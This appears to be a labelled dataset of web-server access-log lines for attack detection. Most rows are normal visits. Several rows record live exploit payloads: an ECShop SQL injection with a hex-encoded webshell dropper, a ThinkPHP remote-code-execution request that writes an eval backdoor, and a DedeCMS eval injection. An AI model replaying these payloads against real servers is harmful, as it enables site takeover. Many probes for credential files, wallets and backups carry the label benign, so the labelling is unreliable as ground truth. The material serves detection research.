+"HEAD /backups/wallet.dat HTTP/1.1 STATUS=301 BYTES=185 UA=""-""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36""",benign
+"HEAD /bak/secrepo.com.rar HTTP/1.1 STATUS=301 BYTES=186 UA=""-""",benign
+"HEAD /back/wallet.dat HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13196 REF=""android-app://com.google.android.gm/"" UA=""Mozilla/5.0 (Linux; Android 12; EB2101) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36""",benign
+"GET /assets/plugins/fileupload/server/php/index.php?file=tf2rghf.jpg HTTP/1.1 STATUS=301 BYTES=601 UA=""ALittle Client""",command_exec
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 REF=""www.secrepo.com"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13195 UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/70.0.3538.75 Mobile/15E148 Safari/605.1""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13195 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.46""",benign
+"HEAD /.well-known.zip HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",suspicious_path_probe
+"GET / HTTP/1.1 STATUS=200 BYTES=13159 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36""",benign
+"HEAD /backups/website.tar HTTP/1.1 STATUS=301 BYTES=186 UA=""-""",benign
+"HEAD /restore/www.tar HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"GET /.env HTTP/1.1 STATUS=404 BYTES=519 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36""",suspicious_path_probe
+"HEAD /backup.tar HTTP/1.1 STATUS=301 BYTES=177 UA=""-""",benign
+"HEAD /backup/sql.sql HTTP/1.1 STATUS=301 BYTES=181 UA=""-""",benign
+"HEAD /backups/website.rar HTTP/1.1 STATUS=301 BYTES=186 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=49089 REF=""https://izhpnevmo.ru/"" UA=""Opera/9.0 (Windows NT 5.1; U; en)""",benign
+"HEAD /backup/backup.sql HTTP/1.1 STATUS=301 BYTES=184 UA=""-""",benign
+"HEAD /wallet.dat HTTP/1.1 STATUS=301 BYTES=177 UA=""-""",benign
+"HEAD /backup/bak.rar HTTP/1.1 STATUS=301 BYTES=181 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36""",benign
+"HEAD /back/backup.sql.tar HTTP/1.1 STATUS=301 BYTES=186 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13187 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36""",benign
+"GET /.git/info/refs?service=git-upload-pack HTTP/1.1 STATUS=404 BYTES=294 UA=""git/2.17.1""",suspicious_path_probe
+"HEAD /back/sql.sql HTTP/1.1 STATUS=301 BYTES=179 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36""",benign
+"HEAD /bak/directory.tar HTTP/1.1 STATUS=301 BYTES=184 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=419 UA=""-""",benign
+"HEAD /restore/backup.sql.tar HTTP/1.1 STATUS=301 BYTES=189 UA=""-""",benign
+"HEAD /backup/wallet.dat HTTP/1.1 STATUS=301 BYTES=184 UA=""-""",benign
+"GET /user.php?act=login HTTP/1.1 STATUS=404 BYTES=305 REF=""554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:""num"";s:288:""*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -"";s:2:""id"";s:3:""'/*"";}"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",sql_injection
+"GET / HTTP/1.1 STATUS=200 BYTES=13151 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36""",benign
+"HEAD /bak/bak.tar HTTP/1.1 STATUS=301 BYTES=178 UA=""-""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=350 UA=""Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6""",benign
+"HEAD /back/.env HTTP/1.1 STATUS=301 BYTES=176 UA=""-""",suspicious_path_probe
+"HEAD /back/secrepo.com.rar HTTP/1.1 STATUS=301 BYTES=187 UA=""-""",benign
+"HEAD /backup/credentials.txt HTTP/1.1 STATUS=301 BYTES=189 UA=""-""",benign
+"HEAD /bak/secrepo.com.sql HTTP/1.1 STATUS=301 BYTES=186 UA=""-""",benign
+"GET /up.php HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36""",command_exec
+"GET / HTTP/1.1 STATUS=301 BYTES=475 REF=""android-app://com.google.android.gm/"" UA=""Mozilla/5.0 (Linux; Android 12; EB2101) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36""",benign
+"HEAD /restore/.env HTTP/1.1 STATUS=404 BYTES=275 UA=""-""",suspicious_path_probe
+"HEAD /directory.tar HTTP/1.1 STATUS=301 BYTES=180 UA=""-""",benign
+"HEAD /backup/www.tar HTTP/1.1 STATUS=301 BYTES=181 UA=""-""",benign
+"HEAD /restore/public_html.rar HTTP/1.1 STATUS=301 BYTES=190 UA=""-""",benign
+"HEAD /back/backup.rar HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13196 UA=""Iframely/1.3.1 (+https://iframely.com/docs/about)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36""",benign
+"HEAD /backup/www.rar HTTP/1.1 STATUS=301 BYTES=181 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13196 UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/70.0.3538.75 Mobile/15E148 Safari/605.1""",benign
+"HEAD /backup/website.rar HTTP/1.1 STATUS=301 BYTES=185 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13152 UA=""Mozilla/5.0 (compatible; Embedly/0.2; +http://support.embed.ly/)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=387 UA=""Apache-HttpClient/4.5.3 (Java/11.0.11)""",benign
+"GET /uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\"";eval($_POST[ysy]);die();// HTTP/1.1 STATUS=418 BYTES=746 REF=""http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\%22;eval($_POST[ysy]);die();//"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",command_exec
+"GET / HTTP/1.1 STATUS=200 BYTES=49089 UA=""curl/7.68.0""",benign
+"HEAD /restore/sftp-config.json HTTP/1.1 STATUS=301 BYTES=191 UA=""-""",benign
+"GET /Datasets Description/Network/http.html HTTP/1.1 STATUS=200 BYTES=1709 UA=""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36""",benign
+"GET /?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$ HTTP/1.1 STATUS=418 BYTES=746 REF=""http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",command_exec
+"HEAD /restore/backup.tar HTTP/1.1 STATUS=301 BYTES=185 UA=""-""",benign
+"HEAD /backups/.well-known.zip HTTP/1.1 STATUS=404 BYTES=275 UA=""-""",suspicious_path_probe
+"HEAD /secrepo.com.sql HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"HEAD /old/backup.tar HTTP/1.1 STATUS=301 BYTES=181 UA=""-""",benign
+"HEAD /restore/www.rar HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"HEAD /old/directory.rar HTTP/1.1 STATUS=301 BYTES=184 UA=""-""",benign
+"HEAD /old/dump.sql HTTP/1.1 STATUS=301 BYTES=179 UA=""-""",benign
+"HEAD /dump.sql HTTP/1.1 STATUS=301 BYTES=175 UA=""-""",benign
+"HEAD /backup/public_html.rar HTTP/1.1 STATUS=301 BYTES=189 UA=""-""",benign
+"HEAD /old/public_html.rar HTTP/1.1 STATUS=301 BYTES=186 UA=""-""",benign
+"HEAD /back/public_html.tar HTTP/1.1 STATUS=301 BYTES=187 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13157 UA=""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36""",benign
+"HEAD /old/credentials.txt HTTP/1.1 STATUS=301 BYTES=186 UA=""-""",benign
+"HEAD /back/config.json HTTP/1.1 STATUS=301 BYTES=183 UA=""-""",benign
+"GET /.git/config HTTP/1.1 STATUS=301 BYTES=497 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36""",suspicious_path_probe
+"HEAD /bak.tar HTTP/1.1 STATUS=301 BYTES=174 UA=""-""",benign
+"HEAD /old/backup.sql HTTP/1.1 STATUS=301 BYTES=181 UA=""-""",benign
+"HEAD /restore/credentials.txt HTTP/1.1 STATUS=301 BYTES=190 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0""",benign
+"GET /uploads/up.php HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36""",command_exec
+"GET / HTTP/1.1 STATUS=200 BYTES=13185 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15""",benign
+"GET / HTTP/1.0 STATUS=301 BYTES=438 UA=""Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10""",benign
+"HEAD /restore/public_html.tar HTTP/1.1 STATUS=301 BYTES=190 UA=""-""",benign
+"HEAD /back/.well-known.zip HTTP/1.1 STATUS=404 BYTES=275 UA=""-""",suspicious_path_probe
+"HEAD /backup/config.json HTTP/1.1 STATUS=301 BYTES=185 UA=""-""",benign
+"GET /Datasets Description/PE_malware/VirusShare.html HTTP/1.1 STATUS=200 BYTES=1651 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 Google-PageRenderer Google (+https://developers.google.com/+/web/snippet/)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0""",benign
+"HEAD /credentials.txt HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"HEAD /bak/.bash_history HTTP/1.1 STATUS=301 BYTES=184 UA=""-""",benign
+"GET /user.php?act=login HTTP/1.1 STATUS=404 BYTES=305 REF=""45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:""num"";s:297:""*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -"";s:2:""id"";s:11:""-1' UNION/*"";}45ea207d7a2b68c49582d2d22adf953a"" UA=""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)""",sql_injection
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1""",benign
+"HEAD /restore/wallet.dat HTTP/1.1 STATUS=301 BYTES=185 UA=""-""",benign
+"HEAD /restore/www.sql HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=438 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36""",benign
+"GET /Datasets Description/PE_malware/VirusShare.html HTTP/1.1 STATUS=200 BYTES=1661 UA=""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0""",benign
+"HEAD /bak/sql.sql HTTP/1.1 STATUS=301 BYTES=178 UA=""-""",benign
+"HEAD /backups/backup.rar HTTP/1.1 STATUS=301 BYTES=185 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=419 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13185 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0,gzip(gfe)""",benign
+"HEAD /backups/sftp-config.json HTTP/1.1 STATUS=301 BYTES=191 UA=""-""",benign
+"HEAD /backup/secrepo.com.sql HTTP/1.1 STATUS=301 BYTES=189 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13196 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36""",benign
+"HEAD /restore/directory.rar HTTP/1.1 STATUS=301 BYTES=188 UA=""-""",benign
+"HEAD /backups/www.rar HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=49089 UA=""-""",benign
+"HEAD /old/directory.tar HTTP/1.1 STATUS=301 BYTES=184 UA=""-""",benign
+"HEAD /old/config.json HTTP/1.1 STATUS=301 BYTES=182 UA=""-""",benign
+"HEAD /old/.well-known.zip HTTP/1.1 STATUS=301 BYTES=186 UA=""-""",suspicious_path_probe
+"HEAD /back/website.tar HTTP/1.1 STATUS=301 BYTES=183 UA=""-""",benign
+"HEAD /back/credentials.txt HTTP/1.1 STATUS=301 BYTES=187 UA=""-""",benign
+"HEAD /bak/backup.tar HTTP/1.1 STATUS=301 BYTES=181 UA=""-""",benign
+"HEAD /backup/website.tar HTTP/1.1 STATUS=301 BYTES=185 UA=""-""",benign
+"HEAD /backup/.bash_history HTTP/1.1 STATUS=301 BYTES=187 UA=""-""",benign
+"HEAD /bak/credentials.txt HTTP/1.1 STATUS=301 BYTES=186 UA=""-""",benign
+"HEAD /bak/dump.sql HTTP/1.1 STATUS=301 BYTES=179 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13196 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36""",benign
+"HEAD /old/www.tar HTTP/1.1 STATUS=301 BYTES=178 UA=""-""",benign
+"GET /honeypot/BSidesDFW - 2014.ipynb HTTP/1.1 STATUS=200 BYTES=170820 UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/zh_CN""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36""",benign
+"HEAD /backup/backup.sql.tar HTTP/1.1 STATUS=301 BYTES=188 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13158 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13196 UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1""",benign
+"HEAD /backup/.env HTTP/1.1 STATUS=404 BYTES=275 UA=""-""",suspicious_path_probe
+"GET /honeypot/BSidesDFW - 2014.ipynb HTTP/1.1 STATUS=301 BYTES=481 UA=""Tornado-Async-Client""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13187 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"HEAD /restore/secrepo.com.rar HTTP/1.1 STATUS=301 BYTES=190 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36""",benign
